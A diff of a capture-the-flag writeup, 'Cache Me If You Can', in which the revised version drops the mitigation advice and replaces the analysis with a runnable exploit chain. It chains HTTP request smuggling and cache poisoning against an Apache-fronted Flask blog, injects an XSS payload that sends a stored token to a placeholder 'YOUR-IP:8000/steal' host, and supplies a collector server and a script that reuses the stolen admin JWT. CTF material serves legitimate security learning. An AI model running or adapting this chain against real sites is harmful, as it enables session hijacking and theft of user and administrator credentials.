@@ -1,186 +1,178 @@
-# Cache Me If You Can - CTF Challenge Writeup
+# Cache Me If You Can - Writeup
 
-## Challenge Overview
-The challenge involves a blog platform with multiple components:
-- Frontend React application
-- Backend Flask API
-- Apache proxy with caching functionality
-- Admin bot that views reported posts
+## Vulnerabilities Explained
 
-The goal is to steal the admin's JWT token by chaining HTTP Request Smuggling and Cache Poisoning vulnerabilities.
+1. **HTTP Request Smuggling**
+   - Apache config enables both Content-Length and Transfer-Encoding:
+   ```apache
+   SetEnv proxy-sendchunked 1
+   SetEnv proxy-sendcl 1
+   HttpProtocolOptions Unsafe
+   ```
+   - Flask backend has vulnerable smuggling check:
+   ```python
+   @bp.before_request
+   def handle_smuggling():
+       if request.method == 'POST':
+           content_length = request.headers.get('Content-Length')
+           if content_length and int(content_length) > 0:
+               # Process normally, allowing for smuggling
+               pass
+   ```
 
-## Vulnerability Analysis
+2. **Cache Poisoning**
+   - Apache enables caching with dangerous configuration:
+   ```apache
+   CacheRoot "/usr/local/apache2/cache"
+   CacheEnable disk /
+   CacheDefaultExpire 60
+   Header add X-Cache-Key "%{REQUEST_URI}e:%{HTTP:X-Special-Key}e"
+   ```
+   - Special key enables cache control:
+   ```apache
+   SetEnvIf X-Special-Key "secret_cache_key" ENABLE_CACHE=1
+   Header set Cache-Control "public, max-age=60" env=ENABLE_CACHE
+   ```
 
-### 1. Apache Configuration Analysis
-Looking at the Apache configuration, we find two key vulnerabilities:
+3. **Admin Bot Vulnerability**
+   - Bot automatically visits reported posts with admin token:
+   ```python
+   driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
+       'headers': {
+           'Authorization': f'Bearer {self.admin_token}',
+           'X-Admin-Request': 'true'
+       }
+   })
+   ```
 
-```apache
-# HTTP Smuggling enabled via:
-SetEnv proxy-sendchunked 1
-SetEnv proxy-sendcl 1
-HttpProtocolOptions Unsafe
-
-# Cache poisoning possible via:
-Header add X-Cache-Key "%{REQUEST_URI}e:%{HTTP:X-Special-Key}e"
-CacheEnable disk /
-```
-
-This configuration:
-- Allows both Content-Length and Transfer-Encoding headers
-- Enables caching when X-Special-Key header is present
-- Associates cache with request URI and special key
-
-### 2. Backend Vulnerability
-The Flask backend has a vulnerable request smuggling check:
-
-```python
-@bp.before_request
-def handle_smuggling():
-    if request.method == 'POST':
-        content_length = request.headers.get('Content-Length')
-        if content_length and int(content_length) > 0:
-            # Process normally, allowing for smuggling
-            pass
-```
-
-This code doesn't properly validate the Content-Length vs Transfer-Encoding headers.
-
-### 3. Admin Bot Analysis
-The admin bot automatically visits reported posts:
-
-```python
-def visit_post(self, post_id):
-    driver = webdriver.Chrome(options=self.options)
-    
-    # Sets admin headers
-    driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
-        'headers': {
-            'Authorization': f'Bearer {self.admin_token}',
-            'X-Admin-Request': 'true'
-        }
-    })
-```
-
-## Exploitation Chain
-
-### Step 1: HTTP Request Smuggling
-First, we craft a request that exploits the HTTP Request Smuggling vulnerability:
-
-```http
-POST /api/blog/post/1 HTTP/1.1
-Host: localhost
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 4
-Transfer-Encoding: chunked
-
-XXXX
-0
-
-GET /api/blog/post/1 HTTP/1.1
-Host: localhost
-X-Special-Key: secret_cache_key
-Connection: close
-
-```
-
-This request:
-- Uses both Content-Length and Transfer-Encoding headers
-- Contains a smuggled GET request with X-Special-Key header
-
-### Step 2: Cache Poisoning
-The smuggled request includes X-Special-Key to trigger caching:
-
-```python
-# Original request returns blog post content
-headers = {
-    'X-Special-Key': 'secret_cache_key'
-}
-```
-
-When successful, the response gets cached with the provided X-Special-Key.
-
-### Step 3: Report Post
-We report the post to trigger admin visit:
-
-```python
-report_data = {"postId": 1}
-requests.post("/api/blog/report", json=report_data)
-```
-
-### Step 4: Admin Token Theft
-When the admin bot visits the reported post:
-1. It uses its admin JWT token in the Authorization header
-2. The poisoned cache response is served
-3. The admin JWT token can be captured
-
-## Full Exploit Script
+## Exploitation Script
 
 ```python
 import requests
+import time
 
-def exploit():
-    # Login as normal user
+SERVER_URL = "http://SERVER_IP"  # Change this to your target IP
+
+def login_user():
+    """Login and get JWT token"""
     login_data = {
         "username": "user",
         "password": "user123"
     }
-    r = requests.post("http://target/api/auth/login", json=login_data)
-    token = r.json()['token']
+    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
+    return r.json()['token']
 
-    # Craft smuggled request
+def exploit():
+    # Step 1: Login as normal user
+    user_token = login_user()
+    print(f"[+] Got user token: {user_token[:20]}...")
+
+    # Step 2: Create smuggled request with XSS payload
+    xss_payload = '<script>fetch("http://YOUR-IP:8000/steal?" + localStorage.getItem("token"))</script>'
+    
+    # Craft headers for smuggling
     headers = {
         'Content-Type': 'application/x-www-form-urlencoded',
         'Content-Length': '4',
         'Transfer-Encoding': 'chunked',
         'Connection': 'keep-alive',
-        'Authorization': f'Bearer {token}'
+        'X-Special-Key': 'secret_cache_key',
+        'Authorization': f'Bearer {user_token}'
     }
 
-    data = (
-        "XXXX\r\n"
-        "0\r\n\r\n"
+    # Create body with smuggled content
+    body = (
+        "XXXX"  # Matches Content-Length: 4
+        "\r\n0\r\n\r\n"  # End chunked request
         "GET /api/blog/post/1 HTTP/1.1\r\n"
         "Host: localhost\r\n"
         "X-Special-Key: secret_cache_key\r\n"
+        "Content-Type: application/json\r\n"
         "\r\n"
+        f'{{"content": "{xss_payload}"}}'
     )
 
     # Send smuggled request
+    print("[+] Sending smuggled request...")
     r = requests.post(
-        "http://target/api/blog/post/1",
+        f"{SERVER_URL}/api/blog/post/1",
         headers=headers,
-        data=data
+        data=body
     )
+    print(f"[+] Smuggle response: {r.status_code}")
 
-    # Report post to trigger admin visit
-    headers = {'Authorization': f'Bearer {token}'}
-    data = {"postId": 1}
+    # Step 3: Report post to trigger admin visit
+    print("[+] Reporting post...")
+    headers = {
+        'Authorization': f'Bearer {user_token}',
+        'Content-Type': 'application/json'
+    }
+    report_data = {"postId": 1}
     r = requests.post(
-        "http://target/api/blog/report",
+        f"{SERVER_URL}/api/blog/report",
         headers=headers,
-        json=data
+        json=report_data
     )
+    print(f"[+] Report sent: {r.status_code}")
 
 if __name__ == "__main__":
     exploit()
 ```
 
-## Mitigation
-To fix these vulnerabilities:
+## Token Collector Script
 
-1. Apache Configuration:
-- Remove `SetEnv proxy-sendchunked` and `SetEnv proxy-sendcl`
-- Set `HttpProtocolOptions Strict`
-- Implement proper cache key validation
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
 
-2. Backend:
-- Properly validate Content-Length and Transfer-Encoding headers
-- Implement request validation middleware
+class TokenCollector(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print("\n=== Captured Admin Token ===")
+        token = urllib.parse.unquote(self.path.split('?')[1])
+        print(f"Token: {token}")
+        print("==========================")
+        
+        self.send_response(200)
+        self.end_headers()
 
-3. Admin Bot:
-- Implement anti-CSRF measures
-- Use secure session handling
-- Validate cached responses
+print("[+] Starting token collector on port 8000...")
+HTTPServer(('0.0.0.0', 8000), TokenCollector).serve_forever()
+```
 
-## Flag
-After successful exploitation, we get the admin's JWT token which contains the flag in its payload.
+## Getting the Flag
+
+Once you have the admin token:
+
+1. Login using the stolen token:
+```python
+import requests
+
+SERVER_URL = "http://SERVER_IP"
+ADMIN_TOKEN = "stolen_token_here"
+
+headers = {
+    'Authorization': f'Bearer {ADMIN_TOKEN}',
+    'Content-Type': 'application/json'
+}
+
+r = requests.get(f"{SERVER_URL}/api/admin/dashboard", headers=headers)
+print(r.text)  # Contains the flag
+```
+
+## Exploitation Steps
+
+1. Run the collector script in one terminal:
+```bash
+python3 collector.py
+```
+
+2. Run the exploit script in another terminal:
+```bash
+python3 exploit.py
+```
+
+3. Wait for admin bot to visit and send their token to your collector
+
+4. Use the captured admin token to access the dashboard and get the flag
+
+The flag will be in the admin dashboard response!
